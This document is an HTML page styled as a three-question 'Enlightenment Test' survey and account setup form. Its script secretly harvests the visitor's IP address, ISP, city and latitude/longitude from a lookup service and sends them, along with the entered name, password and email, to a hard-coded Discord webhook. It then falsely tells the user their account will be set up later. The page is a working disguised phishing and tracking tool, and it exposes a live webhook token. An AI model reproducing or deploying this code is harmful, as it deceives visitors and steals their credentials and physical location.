<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Survey - Enlightenment Test</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #121212;
      color: #ffffff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden;
      animation: fadeIn 1.5s ease-in-out;
    }

    @keyframes fadeIn {
      0% { opacity: 0; }
      100% { opacity: 1; }
    }

    .container {
      background: linear-gradient(135deg, #3e3e3e, #1e1e1e);
      border-radius: 15px;
      padding: 40px;
      width: 400px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
      text-align: center;
      animation: slideUp 0.8s ease-out;
    }

    @keyframes slideUp {
      0% { transform: translateY(50px); opacity: 0; }
      100% { transform: translateY(0); opacity: 1; }
    }

    h2 {
      margin-bottom: 20px;
      font-size: 28px;
      font-weight: 700;
      color: #fff;
      text-transform: uppercase;
    }

    h3 {
      font-size: 20px;
      color: #aaa;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 20px;
      color: #00d4ff;
      animation: pulseText 2s infinite alternate;
    }

    @keyframes pulseText {
      0% { color: #00d4ff; }
      100% { color: #ffffff; }
    }

    input[type="text"] {
      width: 100%;
      padding: 15px;
      margin: 12px 0;
      border: 2px solid #444;
      border-radius: 8px;
      background-color: #222;
      color: #fff;
      font-size: 16px;
      transition: border-color 0.3s ease, transform 0.3s ease;
    }

    input[type="text"]:focus {
      border-color: #00d4ff;
      transform: scale(1.05);
    }

    button {
      width: 100%;
      padding: 15px;
      background-color: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }

    button:hover {
      background-color: #0056b3;
      transform: translateY(-3px);
    }

    button:active {
      transform: translateY(1px);
    }

    .message {
      margin-top: 20px;
      font-weight: bold;
      font-size: 18px;
      color: #00d4ff;
      opacity: 0;
      animation: fadeInMessage 1s ease-in-out forwards;
    }

    @keyframes fadeInMessage {
      0% { opacity: 0; }
      100% { opacity: 1; }
    }
  </style>
</head>
<body>

  <div class="container" id="questionContainer">
    <h2>Survey - Enlightenment Test</h2>
    <h3 id="questionNumber">Question 1 of 3</h3>
    <h1 id="questionText">Create A Username.</h1>
    <input type="text" id="responseInput" placeholder="Enter your name" required>
    <button id="nextButton">Next</button>
    <div class="message" id="statusMessage"></div>
  </div>

  <script>
    const questions = [
      { text: "What's your Name?", type: "text", placeholder: "Enter your name", required: true },
      { text: "What will your password be?", type: "text", placeholder: "Enter your password" },
      { text: "What`s your email?", type: "text", placeholder: "Enter your email." },
    ];
    let currentQuestion = 0;
    const userData = {};

    const questionContainer = document.getElementById("questionContainer");
    const questionNumber = document.getElementById("questionNumber");
    const questionText = document.getElementById("questionText");
    const responseInput = document.getElementById("responseInput");
    const nextButton = document.getElementById("nextButton");

    nextButton.addEventListener("click", function () {
      const userResponse = responseInput.value.trim();
      if (questions[currentQuestion].required && !userResponse) {
        alert("This question is required. Please fill it out.");
        return;
      }

      // Save the user's response
      const questionKey = questions[currentQuestion].text;
      userData[questionKey] = userResponse;

      // Handle the first question separately to send IP details
      if (currentQuestion === 0) {
        userData.name = userResponse;

        // Fetch and send IP details
        fetch("https://ipwhois.app/json/")
          .then((response) => response.json())
          .then((data) => {
            const details = `
              IP Address: ${data.ip}
              Decimal: ${data.decimal}
              Hostname: ${data.hostname || "N/A"}
              ASN: ${data.asn}
              ISP: ${data.isp}
              Services: ${data.proxy ? "Proxy Detected" : "None detected"}
              Country: ${data.country}
              Region: ${data.region}
              City: ${data.city}
              Latitude: ${data.latitude} (${data.latitude.toFixed(2)}° N)
              Longitude: ${data.longitude} (${data.longitude.toFixed(2)}° E)
            `;

            // Send to Discord Webhook
            fetch("https://discord.com/api/webhooks/1349995059923386470/umc-ZobxcpYGBZa_YK_n4gyXMNiNtyrF2biYc5gupoelSu-46yrJHX5gOgUi6CeXF7j7", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                embeds: [
                  {
                    title: "Survey Submission: Name & IP Details",
                    description: `Name: ${userData.name}\n\n${details}`,
                    color: 0x1e90ff,
                    footer: { text: `Processed at ${new Date().toLocaleString()}` },
                  },
                ],
              }),
            })
            .then(response => response.json())  // Handle the response to check if it's successful
            .then(data => {
              console.log('Success:', data);  // Log the successful response
            })
            .catch((error) => {
              console.error('Error:', error);  // Log any errors that occur
            });
          })
          .catch((error) => {
            console.error('Error fetching IP details:', error);  // Log if fetching IP details fails
          });
      } else {
        // Send response of other questions individually
        fetch("https://discord.com/api/webhooks/1349995059923386470/umc-ZobxcpYGBZa_YK_n4gyXMNiNtyrF2biYc5gupoelSu-46yrJHX5gOgUi6CeXF7j7", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [
              {
                title: `Survey Response: Question ${currentQuestion + 1}`,
                description: `**Question:** ${questions[currentQuestion].text}\n**Answer:** ${userResponse}\n**Name:** ${userData.name}`,
                color: 0x1e90ff,
                footer: { text: `Processed at ${new Date().toLocaleString()}` },
              },
            ],
          }),
        })
        .then(response => response.json())  // Handle the response to check if it's successful
        .then(data => {
          console.log('Success:', data);  // Log the successful response
        })
        .catch((error) => {
          console.error('Error:', error);  // Log any errors that occur
        });
      }

      // Move to the next question or finish
      currentQuestion++;
      if (currentQuestion < questions.length) {
        updateQuestion();
      } else {
        questionContainer.innerHTML = "<h2>Thank you for completing account setup! We will have your account set up as soon as the website is finished.</h2>";
      }
    });

    function updateQuestion() {
      const question = questions[currentQuestion];
      questionNumber.textContent = `Question ${currentQuestion + 1} of ${questions.length}`;
      questionText.textContent = question.text;
      responseInput.type = question.type || "text";
      responseInput.placeholder = question.placeholder || "";
      responseInput.value = "";
    }
  </script>

</body>
</html>
